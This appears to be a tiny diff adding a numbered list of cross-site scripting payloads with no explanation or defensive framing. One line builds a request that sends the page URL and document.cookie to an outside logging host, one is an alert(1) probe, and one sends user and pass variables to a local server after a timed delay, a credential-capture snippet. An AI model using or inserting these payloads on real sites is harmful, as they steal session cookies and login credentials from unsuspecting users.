@@ -1,0 +1,4 @@
+$1 //xss.h4x.fun
+$2 "http://h4x.fun/log/img?site="+window.location.href+"&cookie="+document.cookie
+$3.1 alert(1) 
+$3.2 window.setTimeout( function (){ var request = new XMLHttpRequest(); request.open("GET", "http://localhost:8000/?user="+user+"&pass="+pass, true); request.send();}, 5000);
